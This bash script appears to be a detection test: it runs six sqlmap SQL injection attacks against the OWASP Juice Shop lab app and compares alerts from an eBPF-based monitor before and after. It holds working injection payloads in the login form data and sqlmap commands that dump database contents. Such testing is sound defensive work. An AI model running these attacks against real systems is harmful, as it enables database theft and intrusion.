#!/bin/bash
# SQLMap自动化攻击脚本 против OWASP Juice Shop
# Цель: Тестирование способности ebpf-guard детектировать SQL injection атаки

set -e

VPS_IP="${VPS_IP:-localhost}"
JUICE_SH_URL="http://${VPS_IP}:3000"
EBPF_GUARD_API="http://${VPS_IP}:19090"
EBPF_GUARD_TOKEN="${EBPF_GUARD_TOKEN:-$(grep '^admin=' /var/lib/ebpf-guard/token 2>/dev/null | cut -d= -f2)}"  # persisted at /var/lib/ebpf-guard/token
RESULTS_DIR="./sqlmap-results"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)

# Цвета для вывода
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

log() {
    echo -e "${GREEN}[$(date +'%Y-%m-%d %H:%M:%S')]${NC} $1"
}

error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

warn() {
    echo -e "${YELLOW}[WARN]${NC} $1"
}

# Проверка наличия sqlmap
check_sqlmap() {
    if ! command -v sqlmap &> /dev/null; then
        error "sqlmap не установлен. Установите: apt-get install sqlmap"
        exit 1
    fi

    local version
    version=$(sqlmap --version 2>/dev/null | head -1 | tr -d '\r\n*')
    log "sqlmap найден: $version"

    # sqlmap < 1.7 не поддерживает часть флагов, используемых ниже
    # (--parse-errors требует 1.4+; отсутствие свежих tamper/техник на старых
    # версиях даёт много false-negative на level=5/risk=3 сценариях) —
    # апстрим пакеты (apt) часто отстают на несколько лет, поэтому предупреждаем,
    # а не падаем, чтобы не блокировать прогон на CI-образах без pip.
    local major minor
    major=$(echo "$version" | grep -oE '[0-9]+\.[0-9]+' | head -1 | cut -d. -f1)
    minor=$(echo "$version" | grep -oE '[0-9]+\.[0-9]+' | head -1 | cut -d. -f2)
    if [ -n "$major" ] && { [ "$major" -lt 1 ] || { [ "$major" -eq 1 ] && [ "$minor" -lt 7 ]; }; }; then
        warn "sqlmap $version устарел (нужен >= 1.7). Обновите: pip install -U sqlmap  (или git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git)"
    fi
}

# Получение метрик до атаки
get_metrics_before() {
    log "Получение базовых метрик ebpf-guard..."
    curl -s -H "Authorization: Bearer $EBPF_GUARD_TOKEN" "$EBPF_GUARD_API/metrics" > "$RESULTS_DIR/metrics-before-$TIMESTAMP.txt"
    curl -s -H "Authorization: Bearer $EBPF_GUARD_TOKEN" "$EBPF_GUARD_API/api/v1/alerts" > "$RESULTS_DIR/alerts-before-$TIMESTAMP.json"
    log "Метрики сохранены в $RESULTS_DIR/metrics-before-$TIMESTAMP.txt"
}

# Известные SQL injection точки в Juice Shop
JUICE_SH_SQL_ENDPOINTS=(
    # Login form SQLi
    "${JUICE_SH_URL}/rest/user/login"
    # Search SQLi
    "${JUICE_SH_URL}/rest/products/search?q="
    # Basket SQLi
    "${JUICE_SH_URL}/rest/basket/"
    # Feedback SQLi
    "${JUICE_SH_URL}/rest/feedback/"
    # Challenge SQLi
    "${JUICE_SH_URL}/rest/challenges/"
)

# Attack 1: Blind SQL Injection на login
attack_login_blind() {
    log "==========================================="
    log "ATTACK 1: Blind SQL Injection - Login Form"
    log "==========================================="

    local output_dir="$RESULTS_DIR/login_blind_$TIMESTAMP"
    mkdir -p "$output_dir"

    # Juice Shop's login endpoint returns 401 for any failed credential guess —
    # without --ignore-code 401, sqlmap treats every probe response as a
    # generic failure and never confirms the injection (see P3-16 п.1).
    sqlmap -u "${JUICE_SH_URL}/rest/user/login" \
        --data="email=admin@juice-sh.op\"||\"\"==\"&password=test" \
        --method=POST \
        --level=3 \
        --risk=2 \
        --batch \
        --ignore-code=401 \
        --technique=BEUSTQ \
        --dbms=SQLite \
        --dump \
        --output-dir="$output_dir" \
        --flush-session \
        --parse-errors \
        2>&1 | tee "$output_dir/sqlmap.log"

    log "Login blind SQLi завершен. Результаты в $output_dir"
    sleep 5
}

# Attack 2: Error-based SQL Injection на search
attack_search_error() {
    log "==========================================="
    log "ATTACK 2: Error-based SQL Injection - Search"
    log "==========================================="

    local output_dir="$RESULTS_DIR/search_error_$TIMESTAMP"
    mkdir -p "$output_dir"

    sqlmap -u "${JUICE_SH_URL}/rest/products/search?q=" \
        --method=GET \
        --level=2 \
        --risk=1 \
        --batch \
        --technique=E \
        --dbms=SQLite \
        --dump \
        --output-dir="$output_dir" \
        --flush-session \
        --parse-errors \
        2>&1 | tee "$output_dir/sqlmap.log"

    log "Search error-based SQLi завершен. Результаты в $output_dir"
    sleep 5
}

# Attack 3: UNION-based SQL Injection
attack_union() {
    log "==========================================="
    log "ATTACK 3: UNION-based SQL Injection"
    log "==========================================="

    local output_dir="$RESULTS_DIR/union_sqli_$TIMESTAMP"
    mkdir -p "$output_dir"

    # Попытка UNION injection на нескольких endpoint'ах
    for endpoint in "${JUICE_SH_SQL_ENDPOINTS[@]}"; do
        log "Тesting UNION на: $endpoint"
        sqlmap -u "$endpoint" \
            --level=4 \
            --risk=2 \
            --batch \
            --technique=U \
            --union-cols=5 \
            --dbms=SQLite \
            --output-dir="$output_dir" \
            --flush-session \
            --parse-errors \
            2>&1 | tee -a "$output_dir/sqlmap.log" || true
        sleep 2
    done

    log "UNION-based SQLi завершен. Результаты в $output_dir"
    sleep 5
}

# Attack 4: Time-based SQL Injection
attack_time_based() {
    log "==========================================="
    log "ATTACK 4: Time-based SQL Injection"
    log "==========================================="

    local output_dir="$RESULTS_DIR/time_based_$TIMESTAMP"
    mkdir -p "$output_dir"

    sqlmap -u "${JUICE_SH_URL}/rest/user/login" \
        --data="email=admin@juice-sh.op'--&password=test" \
        --method=POST \
        --level=5 \
        --risk=3 \
        --batch \
        --ignore-code=401 \
        --technique=T \
        --time-sec=5 \
        --dbms=SQLite \
        --dump \
        --output-dir="$output_dir" \
        --flush-session \
        --parse-errors \
        2>&1 | tee "$output_dir/sqlmap.log"

    log "Time-based SQLi завершен. Результаты в $output_dir"
    sleep 5
}

# Attack 5: Stacked Query SQL Injection
attack_stacked() {
    log "==========================================="
    log "ATTACK 5: Stacked Query SQL Injection"
    log "==========================================="

    local output_dir="$RESULTS_DIR/stacked_$TIMESTAMP"
    mkdir -p "$output_dir"

    sqlmap -u "${JUICE_SH_URL}/rest/basket/" \
        --method=GET \
        --level=3 \
        --risk=3 \
        --batch \
        --technique=S \
        --dbms=SQLite \
        --output-dir="$output_dir" \
        --flush-session \
        --parse-errors \
        2>&1 | tee "$output_dir/sqlmap.log"

    log "Stacked Query SQLi завершен. Результаты в $output_dir"
    sleep 5
}

# Attack 6: Full comprehensive scan
attack_comprehensive() {
    log "==========================================="
    log "ATTACK 6: Comprehensive SQL Injection Scan"
    log "==========================================="

    local output_dir="$RESULTS_DIR/comprehensive_$TIMESTAMP"
    mkdir -p "$output_dir"

    log "Запуск полного сканирования с crawl..."
    sqlmap -u "${JUICE_SH_URL}" \
        --level=5 \
        --risk=3 \
        --batch \
        --crawl=3 \
        --technique=BEUSTQ \
        --dbms=SQLite \
        --dump \
        --output-dir="$output_dir" \
        --flush-session \
        --parse-errors \
        2>&1 | tee "$output_dir/sqlmap.log"

    log "Comprehensive scan завершен. Результаты в $output_dir"
    sleep 5
}

# Получение метрик после атаки
get_metrics_after() {
    log "Получение метрик после атаки..."
    curl -s -H "Authorization: Bearer $EBPF_GUARD_TOKEN" "$EBPF_GUARD_API/metrics" > "$RESULTS_DIR/metrics-after-$TIMESTAMP.txt"
    curl -s -H "Authorization: Bearer $EBPF_GUARD_TOKEN" "$EBPF_GUARD_API/api/v1/alerts" > "$RESULTS_DIR/alerts-after-$TIMESTAMP.json"

    log "Анализ новых алертов..."
    diff "$RESULTS_DIR/alerts-before-$TIMESTAMP.json" "$RESULTS_DIR/alerts-after-$TIMESTAMP.json" || true
}

# Анализ результатов
analyze_results() {
    log "==========================================="
    log "АНАЛИЗ РЕЗУЛЬТАТОВ"
    log "==========================================="

    local summary_file="$RESULTS_DIR/summary-$TIMESTAMP.txt"

    echo "SQLMAP ATTACK SUMMARY - $TIMESTAMP" > "$summary_file"
    echo "========================================" >> "$summary_file"
    echo "" >> "$summary_file"

    # Подсчет количества алертов. /api/v1/alerts отдаёт JSON-массив, обычно на
    # одной строке — "wc -l" всегда давал 1/1/0 независимо от реального числа
    # элементов. jq считает по массиву, что и требовалось (см. P2-7 п.4).
    local alerts_before=0 alerts_after=0
    if command -v jq &> /dev/null; then
        alerts_before=$(jq 'length' "$RESULTS_DIR/alerts-before-$TIMESTAMP.json" 2>/dev/null || echo 0)
        alerts_after=$(jq 'length' "$RESULTS_DIR/alerts-after-$TIMESTAMP.json" 2>/dev/null || echo 0)
    else
        warn "jq не найден — подсчёт алертов пропущен"
    fi
    local new_alerts=$((alerts_after - alerts_before))

    echo "Алерты до атаки: $alerts_before" >> "$summary_file"
    echo "Алерты после атаки: $alerts_after" >> "$summary_file"
    echo "Новых алертов: $new_alerts" >> "$summary_file"
    echo "" >> "$summary_file"

    # Анализ метрик
    echo "=== METRICS ANALYSIS ===" >> "$summary_file"
    grep -E "alerts_total|events_total|anomalies_total" "$RESULTS_DIR/metrics-after-$TIMESTAMP.txt" >> "$summary_file" || echo "Метрики не найдены"

    echo "" >> "$summary_file"
    echo "=== SQLMAP VULNERABILITIES FOUND ===" >> "$summary_file"
    find "$RESULTS_DIR" -name "*.log" -exec grep -l "vulnerable" {} \; >> "$summary_file" || echo "Уязвимости не найдены"

    # Gate: sqlmap логирует каждую отправленную HTTP-строку с timestamp-префиксом
    # "[HH:MM:SS]" ("[INFO] testing ...", "[WARNING] ...", и т.д.) — если во всех
    # логах прогона таких строк нет, значит sqlmap не отправил ни одного запроса
    # (сбой опций/сети до старта сканирования), и анализировать метрики бессмысленно.
    local total_log_lines
    total_log_lines=$(find "$RESULTS_DIR" -name "sqlmap.log" -newer "$RESULTS_DIR/metrics-before-$TIMESTAMP.txt" -exec grep -cE '^\[[0-9]{2}:[0-9]{2}:[0-9]{2}\]' {} \; 2>/dev/null | awk '{s+=$1} END {print s+0}')
    echo "" >> "$summary_file"
    echo "=== REQUEST GATE ===" >> "$summary_file"
    echo "sqlmap log lines (proxy for requests sent): $total_log_lines" >> "$summary_file"
    if [ "$total_log_lines" -eq 0 ]; then
        error "sqlmap не отправил ни одного запроса за весь прогон — проверьте опции/версию sqlmap выше"
        echo "GATE: FAILED — 0 sqlmap log lines, атаки не выполнялись" >> "$summary_file"
    else
        log "✓ sqlmap отправил запросы (лог-строк: $total_log_lines)"
        echo "GATE: OK" >> "$summary_file"
    fi

    cat "$summary_file"
    log "Summary сохранен в $summary_file"
}

# Главная функция
main() {
    mkdir -p "$RESULTS_DIR"

    log "==========================================="
    log "SQLMAP AUTOMATION AGAINST JUICE SHOP"
    log "==========================================="
    log "Juice Shop URL: $JUICE_SH_URL"
    log "ebpf-guard API: $EBPF_GUARD_API"
    log "Results dir: $RESULTS_DIR"
    log "==========================================="

    check_sqlmap
    get_metrics_before

    # Запуск атак по очереди
    attack_login_blind
    attack_search_error
    attack_union
    attack_time_based
    attack_stacked
    attack_comprehensive

    get_metrics_after
    analyze_results

    log "==========================================="
    log "ВСЕ АТАКИ ЗАВЕРШЕНЫ"
    log "==========================================="
    log "Результаты сохранены в: $RESULTS_DIR"
    log "Проверьте ebpf-guard alerts: $EBPF_GUARD_API/api/v1/alerts"
}

# Запуск
main "$@"
